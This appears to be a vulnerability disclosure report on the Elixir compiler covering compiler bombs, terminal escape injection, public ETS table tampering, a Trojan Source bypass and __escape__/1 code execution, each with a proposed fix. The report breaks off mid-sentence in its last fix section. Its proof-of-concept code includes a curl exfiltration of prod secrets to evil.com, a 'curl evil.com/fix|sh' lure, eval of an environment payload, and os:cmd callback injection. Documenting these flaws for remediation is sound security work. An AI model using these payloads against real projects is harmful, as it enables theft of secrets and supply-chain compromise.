Vulnerability: Exponential Compiler Bomb via Unbounded Recursive Macro Expansion in Bitstring Specs
====================================================================================================

File: lib/elixir/src/elixir_bitstring.erl, lines 228-243
Severity: High (Denial of Service - exponential compiler resource exhaustion)

Description
-----------
The function expand_each_spec/6 handles unknown bitstring type specifiers by
attempting macro expansion via 'Elixir.Macro':expand/2. When the macro expands
to a new form, the result is unpacked by unpack_specs/2 and prepended back onto
the spec list for further processing -- with NO depth or recursion limit.

The vulnerable code path (lines 228-243):

    case 'Elixir.Macro':expand(HA, E#{line := ?line(Meta)}) of
        HA ->
          function_error(Meta, E, ?MODULE, {undefined_bittype, H}),
          expand_each_spec(Meta, T, Map, S, OriginalS, E);
        NewTypes ->
          expand_each_spec(Meta, unpack_specs(NewTypes, []) ++ T, Map, S, OriginalS, E)
    end

Macro.expand/2 only expands the outermost AST node (repeatedly until stable).
It does NOT descend into sub-expressions. However, unpack_specs/2 decomposes
the result along '-' (dash) operators into individual specifier atoms/calls.
Each of these is then processed by expand_each_spec again, which will attempt
macro expansion on any unrecognized specifier. There is no depth counter or
expansion limit.

Exploit (Exponential Compiler Bomb)
------------------------------------
A macro that expands into a '-' expression containing two recursive calls to
itself creates EXPONENTIAL growth -- a billion-laughs style attack:

    defmodule Bomb do
      defmacro boom do
        quote do: boom - boom
      end
    end

    defmodule Victim do
      import Bomb
      def f(<<x::boom>>), do: x    # triggers the vulnerability
    end

Expansion trace:
  Step 0: boom                                         (1 specifier)
  Step 1: boom - boom          -> [boom, boom]         (2 specifiers)
  Step 2: each boom expands    -> [boom,boom,boom,boom] (4 specifiers)
  Step 3: ...                                          (8 specifiers)
  Step N: ...                                          (2^N specifiers)

After just 30 steps: over 1 billion macro expansions.
After 40 steps: over 1 trillion.

The compiler will consume exponential CPU time and memory, effectively hanging
or crashing the build process with a single line of code.

A simpler infinite-loop variant also works with mutually recursive macros:

    defmodule Evil do
      defmacro evil_a(), do: quote(do: evil_b())
      defmacro evil_b(), do: quote(do: evil_a())
    end

    <<0::Evil.evil_a()>>   # infinite expansion loop

Impact
------
- Denial of Service against the Elixir compiler from a single line of code.
- Supply chain attack vector: a compromised Hex package containing such a macro
  would DoS any project that compiles it. The malicious code only needs to be
  imported, not called at runtime.
- CI/CD disruption: automated build pipelines hang indefinitely or OOM-crash.
- The attack surface includes any code path that compiles untrusted Elixir
  (dependencies, code generation, Code.eval_string, IEx, LiveBook, etc.).

Root Cause
----------
Missing recursion depth limit in the macro expansion loop within
expand_each_spec/6. The function recurses with expanded and unpacked results
without tracking how many expansion rounds have occurred.

Secondary Issue: Metadata Propagation Bug (line 64) - confirmed, fixed
----------------------------------------------------
In the inner expand/8 clause for bare expressions (line 53-64), the recursive
call passes `Meta` (extracted from the current element) instead of the original
`BitstrMeta`:

    expand(Meta, Fun, T, EAcc, {SS, OriginalS}, ES, Alignment, RequireSize).

This replaces the bitstring-level metadata with per-element metadata on each
iteration, which can cause incorrect source location tracking.

Fix
---
Add a depth counter parameter to expand_each_spec. When the recursion depth
exceeds a reasonable limit (e.g., 10), emit a compile error and stop expansion:

    expand_each_spec(Meta, _, Map, S, OriginalS, E, Depth) when Depth > 10 ->
        function_error(Meta, E, ?MODULE, max_bittype_expansion_depth),
        {Map, S, E};

Vulnerability: ANSI Escape Sequence Injection in Compiler Warning Output
=========================================================================

File: lib/elixir/src/elixir_lexical.erl, line 119
Severity: Medium-High (Terminal Output Injection / Visual Spoofing)

Description
-----------
The format_error/1 function for unused imports does not sanitize the Function
name before embedding it in compiler warning output:

    format_error({unused_import, {Module, Function, Arity}}) ->
      io_lib:format("unused import ~ts.~ts/~w",
        [elixir_aliases:inspect(Module), Function, Arity]);

The Module is properly sanitized via elixir_aliases:inspect/1, which calls
Macro.inspect_atom/2 and escapes special characters. However, the Function
atom is passed directly to io_lib:format with the ~ts specifier, which
outputs the atom's string representation without any escaping.

Erlang atoms can contain arbitrary bytes, including ANSI terminal escape
sequences (e.g., \e[31m for red text, \e[2J to clear screen). In Elixir,
such atoms are created using quoted syntax like :"foo\e[31mbar\e[0m".

Attack Vector
-------------
1. Attacker publishes a Hex package containing a module with exported
   functions whose names are quoted atoms containing ANSI escape sequences.
2. A victim imports this module but does not use all functions.
3. The compiler emits an "unused import" warning.
4. The unsanitized function name is rendered to the terminal, executing
   the embedded ANSI escape sequences.

Impact
------
- Hide or obscure legitimate compiler warnings (masking other issues)
- Overwrite terminal output to display fake "compilation successful" messages
- Inject misleading error messages that appear to come from the compiler
- Potential exploitation of terminal emulator vulnerabilities via crafted
  escape sequences
- Supply chain attack: malicious Hex dependency could manipulate developer
  terminal output during compilation

Root Cause
----------
Inconsistent sanitization: Module names are sanitized via
elixir_aliases:inspect/1 but Function names are passed raw to io_lib:format.

Fix
---
Apply the same sanitization to Function as is applied to Module:

    format_error({unused_import, {Module, Function, Arity}}) ->
      io_lib:format("unused import ~ts.~ts/~w",
        [elixir_aliases:inspect(Module),
         'Elixir.Macro':inspect_atom(literal, Function),
         Arity]);

Vulnerability: Public ETS Table Allows Arbitrary Module Definition Hijacking
=============================================================================

File: lib/elixir/src/elixir_code_server.erl, line 31
Severity: High (Code Injection / Privilege Escalation on shared Erlang nodes)

Description
-----------
The elixir_modules ETS table is created with `public` access and `named_table`:

    ets:new(elixir_modules, [set, public, named_table, {read_concurrency, true}])

This means ANY Erlang process running on the same node can directly read,
write, and delete entries in this table — completely bypassing the gen_server
(elixir_code_server) that is supposed to be the sole gatekeeper for module
definitions during compilation.

The gen_server enforces important invariants:
- Only one definition of a module can exist at a time (line 35-41: the
  defmodule handler checks for duplicates via ets:lookup before inserting)
- Module definitions are tracked with monitor refs so they are cleaned up
  if the defining process crashes (line 155: erlang:monitor)
- The mod_ets map maintains the Ref->Module mapping for cleanup (line 157)

All of these invariants can be violated by any process that directly
manipulates the public ETS table.

Attack Vector
-------------
1. A malicious Hex dependency (or any code running on the same node, e.g.
   in a Phoenix endpoint, LiveBook, IEx, or a release) can directly call:

       ets:insert(elixir_modules, {TargetModule, ...})
       ets:delete(elixir_modules, TargetModule)

2. Module hijacking during compilation:
   - Attacker watches the ETS table for a target module (e.g., MyApp.Auth)
   - When the legitimate defmodule inserts its entry, attacker deletes it
   - Attacker inserts their own malicious module definition
   - The compiler proceeds with the attacker's definition
   - The resulting .beam file contains attacker-controlled code

3. Race condition exploitation:
   - The gen_server's defmodule handler (line 34-41) does a non-atomic
     check-then-insert: it calls ets:lookup, then ets:insert in defmodule/3
   - Between the lookup and insert, an attacker can insert a conflicting
     entry, causing the legitimate definition to overwrite the attacker's
     entry without error — or vice versa

4. Denial of Service:
   - ets:delete_all_objects(elixir_modules) wipes all in-progress module
     compilations, crashing the build
   - Inserting fake entries for modules about to be compiled causes
     "module already defined" errors

Impact
------
- Code injection: attacker can substitute arbitrary module bytecode during
  compilation, achieving arbitrary code execution at compile time AND at
  runtime when the compiled module is loaded
- Supply chain attack: a malicious dependency only needs to spawn a process
  that manipulates the ETS table; no suspicious macro or compile-time
  callback is needed — just a background process started at load time
- Bypass of duplicate module detection: the gen_server's check-then-insert
  on lines 35-41 is not atomic with respect to direct ETS access
- Silent corruption: replaced module definitions produce no warnings
- Affects any environment where untrusted code shares an Erlang node:
  multi-tenant LiveBook, shared CI runners, Phoenix apps loading plugins

Root Cause
----------
The ETS table is created with `public` access when it should use
`protected` (the default) to restrict writes to the owning process
(the gen_server). All reads from other processes would still work since
`{read_concurrency, true}` is set, and all writes already go through
the gen_server's handle_call/handle_cast interface.

Fix
---
Change the ETS table access from `public` to `protected`:

    ets:new(elixir_modules, [set, protected, named_table, {read_concurrency, true}])

This ensures only the elixir_code_server process (the table owner) can
write to the table, while all other processes retain read access. All
write operations (insert/delete) already flow through the gen_server's
defmodule/undefmodule handlers, so no other code changes are needed.

Vulnerability: ANSI Escape Sequence Injection via Unsanitized Sigil/Binary Content in Parse Errors
====================================================================================================

File: lib/elixir/src/elixir_errors.erl, lines 357-382
Severity: Medium-High (Terminal Output Injection / Visual Spoofing via Parse Errors)

Description
-----------
The parse_error/5 handler for sigil and binary tokens reconstructs
user-controlled content from token representations via parse_erl_term/1 and
interpolates it directly into error messages without sanitizing ANSI escape
sequences. There are two affected code paths:

1. Sigil tokens (line 357-374): When a parse error occurs on a sigil token,
   the token's Erlang term representation is re-parsed by parse_erl_term/1.
   The sigil's binary content (Content2) is extracted and concatenated raw
   into the error message on line 373:

       Message = <<"syntax error before: sigil ", MaybeSigil/binary,
                   "starting with content '", Content2/binary, "'">>,

2. Binary/interpolation tokens (line 377-382): Similarly, binary content (H)
   from interpolation tokens is extracted by parse_erl_term/1 and
   concatenated unsanitized into the error message on line 379:

       {ok, [H | _]} when is_binary(H) -> <<$", H/binary, $">>;

In both cases, the content originates from user source code. For lowercase
(interpolating) sigils like ~s, the Elixir tokenizer processes escape
sequences: \e becomes byte 27 (the ASCII ESC character). The full round-trip
is: tokenizer creates binary with ESC bytes -> ~tp formats token as Erlang
term string with <<27,...>> notation -> parse_erl_term reconstructs the
binary with raw ESC bytes -> binary is concatenated into error message ->
message is printed to terminal -> terminal interprets ANSI escape sequences.

Attack Vector
-------------
1. Attacker crafts Elixir source with a sigil containing ANSI escape sequences
   that also triggers a syntax error. Example:

       1 ~s"\e[2J\e[1;1H\e[31mCRITICAL: run 'curl evil.com/fix|sh'\e[0m"

   The "1 ~s..." is a syntax error (two expressions without an operator).
   The parser error falls on the sigil token, triggering the vulnerable path.

2. The sigil token is formatted by yecc's yecctoken2string via
   io_lib:format("~tp", [Token]), producing a string starting with "{sigil,".

3. parse_error matches <<"{sigil,", _/binary>> (line 357), calls
   parse_erl_term which reconstructs the binary content including raw ESC
   bytes via erl_scan:string + erl_parse:parse_term.

4. Content2 = <<27,91,50,74,...>> (the actual ANSI escape bytes) is spliced
   into the error message and output to standard error.

5. The terminal renders:
   - \e[2J clears the screen (hiding legitimate compiler output)
   - \e[1;1H moves cursor to top-left
   - \e[31m switches to red text
   - Fake alarming message is displayed
   - \e[0m resets formatting

Impact
------
- Clear the terminal screen, hiding legitimate warnings or errors that
  preceded the injected message (masking supply-chain attack indicators)
- Display fake compiler messages (e.g., "compilation successful" when it
  failed, or fake security alerts with social-engineering payloads)
- Exploit terminal emulator vulnerabilities via crafted escape sequences
  (some terminals support OSC sequences that can modify the clipboard,
  window title, or trigger other side effects)
- Attack surface includes any system that compiles untrusted Elixir and
  displays errors in a terminal: CI/CD build logs viewed in terminal
  emulators, code review tools, language servers, shared LiveBook instances

Root Cause
----------
The parse_erl_term/1 function (line 408-416) faithfully reconstructs
arbitrary binary content from Erlang term string representations via
erl_scan:string + erl_parse:parse_term. The calling code on lines 373 and
379 then interpolates this reconstructed binary directly into error messages
without stripping or escaping non-printable characters (specifically the ESC
byte 0x1B that initiates ANSI control sequences).

Fix
---
Sanitize Content2 and H before interpolating into error messages by stripping
or escaping non-printable/control characters:

    sanitize_for_display(Bin) when is_binary(Bin) ->
      << <<C>> || <<C>> <= Bin, C >= 32, C < 127 >>.

Apply to line 373:
    Message = <<"syntax error before: sigil ", MaybeSigil/binary,
                "starting with content '", (sanitize_for_display(Content2))/binary, "'">>,

Apply to line 379:
    {ok, [H | _]} when is_binary(H) -> <<$", (sanitize_for_display(H))/binary, $">>;

Fixed: Incomplete Variable Check in Binary Generator Optimization Causes Compilation Crash (DoS) - fixed
==========================================================================================================

File: lib/elixir/src/elixir_erl_for.erl, lines 321-322
Severity: High (Denial of Service - compilation crash via dependency)

Description
-----------
The `no_var_size/1` function, which guards the "NoVarClauses" optimization
for binary generators in `for` comprehensions, only checks for bare variable
references `{var, _, _}` in binary segment sizes:

    no_var_size({var, _, _}) -> throw(unbound_size);
    no_var_size(Size) -> Size.

It does NOT recursively inspect complex size expressions for embedded
variables. Any size expression that is not a bare variable passes through
unchanged, even if it contains pattern-bound variables that will be
unbound in the generated optimization clause.

The `no_var` function (lines 310-317) generates a "fast skip" clause
(`NoVarClauses`) for binary generators where all value expressions are
replaced with wildcards (`_`), but SIZE expressions are preserved as-is.
When a size expression references a pattern-bound variable (e.g., `s` in
`<<s::8, chunk::binary-size(s * 1)>>`), the wildcard replacement removes
the binding for `s`, but the size expression `s * 1` still references it.
This produces generated Erlang code with an unbound variable, causing the
Erlang compiler to reject the module with an opaque error.

Affected Code Paths
--------------------
The `no_var` optimization is used in `build_reduce_each` for binary
generators (lines 278-284). This path is taken when the `for`
comprehension uses any of:

  - `uniq: true`
  - `into:` with a custom collectable (MapSet, structs, etc.)
  - Mixed enum + binary generators
  - `into: %{}` (empty map)

The native Erlang comprehension path (used for simple binary-only `for`
without uniq or custom into) is NOT affected.

Exploit
-------
A malicious Hex dependency can export a macro that, when used by the
victim, causes compilation to fail:

    # In malicious dependency
    defmodule EvilMacro do
      defmacro parse_packets(data) do
        quote do
          for <<s::8, chunk::binary-size(s * 1) <- unquote(data)>>,
              uniq: true, do: chunk
        end
      end
    end

    # In victim's code - compilation crashes
    defmodule Victim do
      require EvilMacro
      def parse(data), do: EvilMacro.parse_packets(data)
    end

    # ** (CompileError) Elixir.Victim: unbound variable '_@1' in parse/1

The crash occurs at compile time with a confusing Erlang-level error
message referencing internal variable names like `_@1` or `_s@1`.

Any complex size expression containing a variable triggers the bug:
  - `size(s * 1)`
  - `size(s + 0)`
  - `size(div(s, 1))`
  - `size(max(s, 0))`

While `size(s)` (bare variable) is correctly handled.

Impact
------
- Denial of Service against the Elixir compiler: a single macro in a
  dependency can prevent any project that uses it from compiling.
- Supply chain attack: a malicious Hex package can break builds by
  providing macros that expand to for comprehensions with complex
  binary size expressions and uniq/into options.
- CI/CD disruption: automated builds fail with opaque Erlang-level
  errors that are difficult to diagnose.
- The error message references internal variable names (`_s@1`),
  providing no useful guidance to the developer.
- Affects any code that compiles Elixir with binary generators using
  computed sizes: Code.compile_file, Mix, IEx, LiveBook, etc.

Root Cause
----------
The `no_var_size/1` function performs a shallow, non-recursive check for
variables. It only matches bare `{var, _, _}` AST nodes. Complex
expressions like `{op, _, '*', {var, _, 's'}, {integer, _, 1}}` (which
represents `s * 1`) pass through unmodified, causing the optimization
clause to reference an unbound variable.

Fix
---
Replace the shallow check with a recursive variable detection:

    no_var_size({var, _, _}) -> throw(unbound_size);
    no_var_size(Expr) when is_tuple(Expr) ->
      lists:foreach(fun no_var_size/1, tl(tuple_to_list(Expr))),
      Expr;
    no_var_size(Expr) when is_list(Expr) ->
      lists:foreach(fun no_var_size/1, Expr),
      Expr;
    no_var_size(Size) -> Size.

Or more conservatively, only allow literal sizes (integers, `default`)
and reject everything else:

    no_var_size({integer, _, _} = Size) -> Size;
    no_var_size(default) -> default;
    no_var_size(_) -> throw(unbound_size).

Fixed: Trojan Source Break-Character Bypass via ASCII Fast-Path in String Interpolation - fixed
================================================================================================

File: lib/elixir/src/elixir_interpolation.erl, lines 83-85
Severity: High (Security Check Bypass / Trojan Source Attack)

Description
-----------
The extract/8 function in elixir_interpolation.erl contains an ASCII
fast-path optimization (lines 83-85) that bypasses the security validation
for dangerous Unicode break characters inside string literals:

    extract([Char1, Char2 | Rest], Buffer, Output, Line, Column, Scope, Interpol, Last)
        when Char1 =< 255, Char2 =< 255 ->
      extract([Char2 | Rest], [Char1 | Buffer], Output, Line, Column + 1, Scope, Interpol, Last);

This clause matches any two consecutive characters that are both <= 255
and processes Char1 directly into the buffer WITHOUT calling extract_char/8.
The security check for bidirectional formatting characters (?bidi) and
dangerous line-break characters (?break) is located exclusively in
extract_char/8 (lines 90-109), which is only reached via the catch-all
clause on lines 87-88.

The ?break(C) macro (defined in elixir_tokenizer.hrl, lines 39-42) guards
against the following characters per Unicode TR55:

    -define(break(C), C =:= 16#000B;    % VERTICAL TAB (11)
                      C =:= 16#000C;    % FORM FEED (12)
                      C =:= 16#0085;    % NEXT LINE (133)
                      C =:= 16#2028;    % LINE SEPARATOR (8232)
                      C =:= 16#2029).   % PARAGRAPH SEPARATOR (8233)

Three of these five characters -- 0x0B (VT), 0x0C (FF), and 0x0085 (NEL)
-- have codepoint values <= 255. When any of these appears inside a string
literal followed by another character <= 255, the fast-path clause on
line 83 matches BEFORE the catch-all on line 87. The character is added
directly to the buffer, completely bypassing the ?break check that should
reject it with an error.

Characters 0x2028 and 0x2029 (> 255) are NOT affected because they fail
the guard `Char1 =< 255` and correctly fall through to extract_char.

Attack Vector (Trojan Source)
-----------------------------
This bypass enables Trojan Source attacks (CVE-2021-42574 class) using
invisible line-break characters in string literals:

1. An attacker embeds a NEL (U+0085) or VT (U+000B) character inside a
   string literal in Elixir source code. These characters are invisible
   in most editors and code review tools.

2. The Elixir compiler should reject these characters with the error:
   "invalid line break character in string: \\u0085"
   But due to the fast-path bypass, they are silently accepted.

3. The invisible break characters can alter how text is displayed in
   terminals, editors, and code review interfaces, creating a visual
   discrepancy between what a reviewer sees and what the code does.

Example:

    # This should be rejected but is silently accepted:
    query = "SELECT * FROM users WHERE admin=false\x{85} OR 1=1--"

    # The NEL character (0x85) causes some terminals/editors to display
    # only "SELECT * FROM users WHERE admin=false" on one line, hiding
    # the SQL injection payload " OR 1=1--" on a visually separate or
    # invisible line.

4. A malicious Hex dependency can contain source files with these
   invisible characters. Code reviewers examining the dependency would
   see apparently benign strings while the actual string content contains
   hidden payloads.

Impact
------
- Bypass of an intentional security control: the ?break check was
  specifically added to prevent Trojan Source attacks via invisible
  line-break characters in strings (per Unicode TR55 recommendations).
- Enables visual spoofing in source code: hidden content in strings
  that is invisible during code review.
- Supply chain attack vector: malicious dependencies can contain
  strings with hidden content that passes compilation without warnings.
- Three out of five guarded break characters (60%) bypass the check.
- Affects all Elixir string literals (double-quoted strings, heredocs,
  sigils with interpolation) processed by elixir_interpolation:extract.

Root Cause
----------
The ASCII fast-path optimization on lines 83-85 was added for performance
(avoiding the unicode_util:gc/1 call for common ASCII characters) but
inadvertently skips the security validation in extract_char. The guard
`Char1 =< 255` is too broad -- it includes the dangerous break characters
0x0B, 0x0C, and 0x85 which should be rejected.

Fix
---
Add explicit clauses for break characters BEFORE the fast-path, or
tighten the fast-path guard to exclude them:

Option 1 - Add rejection clauses before the fast-path:

    extract([Char | _Rest], _Buffer, _Output, Line, Column, _Scope, _Interpol, _Last)
        when ?break(Char) ->
      Token = io_lib:format("\\u~4.16.0B", [Char]),
      {error, {?LOC(Line, Column),
        {"invalid line break character in string: ",
         ". If you want to use such character, use it in its escaped " ++ Token ++ " form instead"},
        Token}};

Option 2 - Tighten the fast-path guard:

    extract([Char1, Char2 | Rest], Buffer, Output, Line, Column, Scope, Interpol, Last)
        when Char1 =< 255, Char2 =< 255,
             not(?break(Char1)), not(?bidi(Char1)) ->
      extract([Char2 | Rest], [Char1 | Buffer], Output, Line, Column + 1, Scope, Interpol, Last);

Vulnerability: Implicit Arbitrary Code Execution and AST Injection via __escape__/1 with Shallow Validation Bypass
====================================================================================================================

File: lib/elixir/src/elixir_quote.erl, lines 186-216 and 323-334
Severity: Critical (Arbitrary Code Execution at Compile Time + AST Injection)

Description
-----------
The `do_escape/2` function for maps (lines 186-216) implicitly invokes
the `__escape__/1` callback on any struct whose module defines it. This
creates an implicit code execution primitive triggered by what developers
expect to be a pure data-to-AST transformation (`Macro.escape/1`). The
return value of `__escape__/1` is validated only by `shallow_valid_ast/1`,
which fails to inspect the contents of argument lists and metadata,
allowing injection of arbitrary terms into the AST.

The vulnerable code path:

    do_escape(Map, Q) when is_map(Map) ->
      maybe
        #{'__struct__' := Module} ?= Map,           % Line 188: Module from data
        true ?= is_atom(Module),
        true ?= (Q#elixir_quote.op /= {struct, Module}),
        {module, Module} ?= code:ensure_loaded(Module),  % Line 192: loads module
        true ?= erlang:function_exported(Module, '__escape__', 1),
        ...
        Expr = Module:'__escape__'(Map),             % Line 201: ARBITRARY CODE EXEC
        case shallow_valid_ast(Expr) of              % Line 202: shallow check only
          true -> Expr;
          ...

Issue 1: Implicit Code Execution from Data (like PHP unserialize/__wakeup)
---------------------------------------------------------------------------
`Macro.escape/1` is a public API that any Elixir code can call. When
called on a struct that defines `__escape__/1`, the callback is invoked
IMPLICITLY -- the caller never explicitly invoked any function on the
struct's module. This is analogous to PHP's `unserialize()` triggering
`__wakeup()` or Python's `pickle` executing `__reduce__`.

The `__escape__/1` function executes with full privileges and can perform
arbitrary side effects (filesystem access, network calls, process spawning)
BEFORE the return value is validated. Even if the callback returns invalid
AST, the side effects have already occurred.

Attack vector:
1. A malicious Hex dependency defines a struct with `__escape__/1`:

       defmodule Innocent.Config do
         defstruct [:settings]

         def __escape__(_struct) do
           # Executes at compile time in victim's project
           System.cmd("curl", ["https://evil.com/exfil",
             "-d", File.read!("config/prod.secret.exs")])
           # Return valid-looking AST to avoid suspicion
           quote do: %Innocent.Config{settings: %{}}
         end
       end

2. Any project that uses this struct in a compile-time context triggers it:

       # In victim's code - __escape__/1 fires silently
       @default_config %Innocent.Config{settings: %{}}

       # Or via Macro.escape:
       defmacro embed_config(config) do
         Macro.escape(config)    # Triggers __escape__/1
       end

3. `code:ensure_loaded(Module)` on line 192 will load the module from the
   code path. A dependency's module is always on the code path after the
   dependency is compiled. No explicit `require` or `import` is needed.

Issue 2: Shallow Validation Bypass Allows AST Injection
--------------------------------------------------------
The `shallow_valid_ast/1` function (lines 323-334) that validates the
return value of `__escape__/1` has critical gaps:

a) **Arguments not validated**: The 3-tuple check on line 332 verifies
   `is_list(Args)` but never inspects the list contents:

       valid_ast_elem({Atom, Meta, Args})
         when is_atom(Atom), is_list(Meta),
              is_atom(Args) orelse is_list(Args) -> true;

   This means `{:foo, [], [make_ref(), self(), Port]}` passes validation
   even though references, PIDs, and ports in argument positions cannot
   be compiled to BEAM bytecode, causing opaque Erlang compiler crashes.

b) **Metadata not validated**: The Meta list is checked with `is_list(Meta)`
   but its contents are never inspected. Arbitrary terms in metadata can
   corrupt compiler state or cause unexpected behavior in macro expansion.

c) **Function closures accepted**: Line 330 accepts `is_function(Expr)`:

       valid_ast_elem(Expr) when is_list(Expr); is_atom(Expr);
         is_binary(Expr); is_number(Expr); is_pid(Expr);
         is_function(Expr) -> true;

   Closures capture their environment and cannot be compiled to BEAM
   bytecode. An `__escape__/1` returning a closure crashes the Erlang
   compiler when the AST is compiled. If the AST is evaluated via
   `Code.eval_quoted`, the closure executes with its captured state.
   This is inconsistent with `do_escape/2` for functions (lines 239-244)
   which correctly rejects closures via the env/type check.

d) **PIDs accepted**: PIDs are runtime-only values that reference specific
   processes. They cannot be serialized into BEAM files. Accepting them
   in validation allows `__escape__/1` to inject PIDs that crash
   compilation or reference attacker-controlled processes at runtime.

Exploit (Combined Attack)
--------------------------
A malicious __escape__/1 can combine both issues:

    defmodule Evil.Wrapper do
      defstruct [:data]

      def __escape__(_struct) do
        # Phase 1: Side effect (exfiltrate, backdoor, etc.)
        Code.eval_string(System.get_env("PAYLOAD") || "nil")

        # Phase 2: Return AST with deep invalid terms
        # Passes shallow_valid_ast but crashes Erlang compiler
        # with opaque error, obscuring the attack
        {:ok, [], [make_ref()]}
      end
    end

The side effects execute silently. The compilation crash from the invalid
AST masks the attack by making it look like a compiler bug rather than
a security incident.

Impact
------
- Arbitrary code execution at compile time via implicit callback, without
  the developer explicitly invoking any function on the malicious module.
- Supply chain attack: a Hex dependency only needs to define a struct with
  `__escape__/1`. Any project that uses the struct literal in a quoted or
  escaped context triggers the callback. Unlike macros, `__escape__/1`
  fires from data usage, not explicit function calls.
- Compiler crash via AST injection: closures, PIDs, and references
  injected through the shallow validation gap cause opaque Erlang-level
  errors that are difficult to diagnose.
- The attack surface includes: struct defaults (`defstruct`), module
  attributes (`@attr %Struct{}`), `Macro.escape/1`, `quote do: ...end`
  containing struct literals, LiveBook evaluation, and any code path that
  compiles Elixir with struct values.
- Unlike macros (which require explicit `require`/`import`/`use`), the
  `__escape__/1` callback fires implicitly from data, making it harder
  to audit and detect in code review.

Root Cause
----------
1. The `do_escape/2` function calls `Module:'__escape__'(Map)` based on
   the `__struct__` key in the data, with no mechanism to restrict which
   modules' callbacks can be invoked or to sandbox the execution.
2. The `shallow_valid_ast/1` function performs only structural checks on
   the top-level AST node, not validating the contents of Args, Meta,
   or deeply nested terms.
3. The `valid_ast_elem/1` function accepts `is_function` and `is_pid`
   as valid AST elements despite these being runtime-only values that
   cannot be compiled to BEAM bytecode.

Fix
---
1. Add a deep validation mode for `__escape__/1` return values:

       deep_valid_ast({Atom, Meta, Args}) when is_atom(Atom), is_list(Meta) ->
         valid_meta(Meta) andalso deep_valid_ast_args(Args);
       deep_valid_ast(List) when is_list(List) ->
         lists:all(fun deep_valid_ast/1, List);
       deep_valid_ast({Left, Right}) ->
         deep_valid_ast(Left) andalso deep_valid_ast(Right);
       deep_valid_ast(Term) when is_atom(Term); is_number(Term); is_binary(Term) ->
         true;
       deep_valid_ast(_) -> false.

2. Remove `is_function` and `is_pid` from `valid_ast_elem`, or add
   an explicit check that only external function references (not closures)
   are accepted:

       valid_ast_elem(Fun) when is_function(Fun) ->
         (erlang:fun_info(Fun, env) == {env, []}) andalso
         (erlang:fun_info(Fun, type) == {type, external});

3. Document `__escape__/1` as a security-sensitive callback and warn
   developers that `Macro.escape/1` on untrusted struct data triggers
   arbitrary code execution in the struct's module.

Vulnerability: Public Per-Module ETS Tables Allow Compile-Time Code Injection via Callback/Attribute Tampering
===============================================================================================================

File: lib/elixir/src/elixir_module.erl, lines 405 and 419
Severity: Critical (Arbitrary Code Execution at Compile Time via ETS Table Tampering)

Description
-----------
During module compilation, elixir_module:build/4 creates two ETS tables
with `public` access to hold ALL compilation state for the module being
defined:

    DataSet = ets:new(Module, [set, public]),              % line 405
    DataBag = ets:new(Module, [duplicate_bag, public]),    % line 419

These tables store:
- Module attributes including `on_load` (executes code when module loads)
- Compile callbacks: `before_compile`, `after_compile`, `after_verify`
  (lines 427-428, 435) -- these are {Module, Function} tuples that the
  compiler calls via eval_callbacks/5 (line 507-511) using apply(M, F, Args)
- Function definitions (via elixir_def)
- Struct definitions
- Type specifications
- Compile options (including `parse_transform`)
- The taint flag that can force compilation errors

Because the tables are `public`, ANY Erlang process running on the same
node can directly insert, modify, or delete entries. This is distinct from
and MORE SEVERE than the elixir_modules table issue (reported separately)
because these tables control the CONTENT of the compiled module, not just
the registry of which modules are being compiled.

Attack Vector 1: Compile Callback Injection
--------------------------------------------
The most direct attack injects a compile callback. The compiler reads
callbacks from the DataBag table and invokes them via apply/3:

    eval_callbacks(Line, DataBag, Name, Args, E) ->
      Callbacks = bag_lookup_element(DataBag, {accumulate, Name}, 2),
      lists:foldl(fun({M, F}, Acc) ->
        expand_callback(Line, M, F, Args, Acc,
          fun(AM, AF, AA) -> apply(AM, AF, AA) end)
      end, E, Callbacks).

An attacker inserts a malicious callback:

    %% Attacker code (runs in any process on the node)
    %% Find the target module's DataBag table
    [DataBag] = [T || T <- ets:all(),
                       ets:info(T, type) == duplicate_bag,
                       ets:info(T, name) == 'Elixir.MyApp.Auth'],

    %% Inject an after_compile callback that executes arbitrary code
    ets:insert(DataBag, {{accumulate, after_compile},
                         {os, cmd}}),

    %% When the compiler reaches line 235:
    %%   eval_callbacks(Line, DataBag, after_compile,
    %%                  [CallbackE, Binary], CallbackE)
    %% It will call os:cmd(CallbackE) -- or more usefully:
    ets:insert(DataBag, {{accumulate, after_compile},
                         {'Elixir.Code', eval_string}}).

The callback is invoked at compile time with the compilation environment
and binary as arguments. The attacker controls which module and function
are called.

Attack Vector 2: @on_load Injection
-------------------------------------
The `on_load` attribute specifies a function to execute when the module
is loaded. An attacker can:

1. Insert a function definition into DataBag via elixir_def's ETS entries
2. Set the on_load attribute in DataSet to point to the injected function
3. When the module is loaded (line 232: code:load_binary), the on_load
   function executes with full privileges

Attack Vector 3: parse_transform Injection
-------------------------------------------
The compile options are read from DataBag (line 202):

    RawCompileOpts = bag_lookup_element(DataBag, {accumulate, compile}, 2)

An attacker inserts a malicious parse_transform:

    ets:insert(DataBag, {{accumulate, compile},
                         {parse_transform, evil_transform}})

The parse_transform runs during Erlang compilation with full access to
the module's abstract forms, allowing arbitrary code modification.

Attack Vector 4: Struct Definition Tampering
---------------------------------------------
The struct definition is read from DataSet (line 560-563):

    get_struct(Set) ->
      case ets:lookup(Set, {elixir, struct}) of
        [] -> nil;
        [{_, Fields}] -> Fields
      end.

An attacker can modify the struct fields, causing downstream code that
pattern-matches on the struct to behave unexpectedly or crash.

Timing Window
--------------
The tables exist from the moment build/4 creates them (line 405/419)
until the `after` block deletes them (line 260-261). For large modules,
this window can be hundreds of milliseconds. The attacker can:

1. Monitor ets:all() for new tables matching the target module name
2. Immediately inject malicious entries
3. The compiler will process the injected entries alongside legitimate ones

On multi-core systems with parallel compilation (common in Mix), many
module tables exist simultaneously, widening the attack surface.

Impact
------
- Arbitrary code execution at compile time: injected callbacks execute
  via apply/3 with no restriction on which functions can be called.
- Silent bytecode modification: injected parse_transforms or modified
  definitions alter the compiled output with no compiler warnings.
- Supply chain attack: a malicious Hex dependency only needs to spawn
  a background process that monitors ETS tables. No macros, no
  compile-time callbacks, no suspicious imports -- just a process that
  manipulates public ETS tables during compilation.
- Runtime code execution: injected @on_load functions execute when the
  compiled module is loaded, persisting the attack beyond compile time.
- Denial of Service: setting the taint flag ({elixir, taint}) in DataSet
  forces a compilation error (line 265-269).
- Affects ALL Elixir compilation: Mix, IEx, LiveBook, Code.compile_file,
  and any tool that compiles Elixir modules.

Root Cause
----------
The per-module ETS tables are created with `public` access when they
should use `protected` or `private`. The tables are only legitimately
accessed by:
1. The process that calls elixir_module:compile (owns the tables)
2. The spawned elixir_erl_compiler process (line 168)

The spawned compiler process needs access, which is why `public` was
likely chosen. However, a safer approach exists: the spawned process
could receive the data via message passing, or the tables could be
created as `protected` with the spawned process inheriting ownership
